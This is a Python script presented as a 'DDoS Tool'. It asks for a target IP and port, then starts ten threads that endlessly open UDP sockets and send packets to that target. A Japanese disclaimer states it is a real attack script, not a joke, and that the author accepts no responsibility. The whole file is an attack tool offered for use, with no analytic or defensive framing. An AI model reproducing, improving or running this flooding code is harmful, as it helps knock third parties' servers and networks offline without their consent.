import os
import sys
import time
import datetime
import random
import string
import threading
import pyfiglet
import socket
from colorama import Fore, Back, Style

os.system('cls')

ascii_banner = pyfiglet.figlet_format("DDoS Tool")
print(ascii_banner)
print("Created by Roiman")
print("\n")
print("\n")
time.sleep(0.3)
print("このDDoSツールはJokeScriptではなく実際に攻撃するScriptです。\nこのツールを使用して何らかの問題が発生した場合、\n製作者は一切の責任を負いません")
time.sleep(0.5)

print("\n")


IP = input("TargetIP : ")
PORT = int(input("TargetPort : "))



def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((IP, PORT))
        i = 0
        if i < 10:
            s.send(b'\x01')
            time = datetime.datetime.now()
            print(f"{time} sendig pocket")
            print("\n")
            print(Fore.YELLOW + "Created by Roiman")
            print("\n")
            print(Fore.GREEN + "DDoS-Tools")
            print("\n")
            myip = socket.gethostbyname(socket.gethostname())
            print(Fore.BLUE + f"{myip}")
            print("\n")
            host = socket.gethostname()
            print(Fore.CYAN + f"PC NAME {host}")
            print("\n")
            print("\n")
            print(Fore.RED + f"------------------------------")


thread1 = threading.Thread(target=attack)
thread2 = threading.Thread(target=attack)
thread3 = threading.Thread(target=attack)
thread4 = threading.Thread(target=attack)
thread5 = threading.Thread(target=attack)
thread6 = threading.Thread(target=attack)
thread7 = threading.Thread(target=attack)
thread8 = threading.Thread(target=attack)
thread9 = threading.Thread(target=attack)
thread10 = threading.Thread(target=attack)


thread1.start()
thread2.start()
thread3.start()
thread4.start()
thread5.start()
thread6.start()
thread7.start()
thread8.start()
thread9.start()
thread10.start()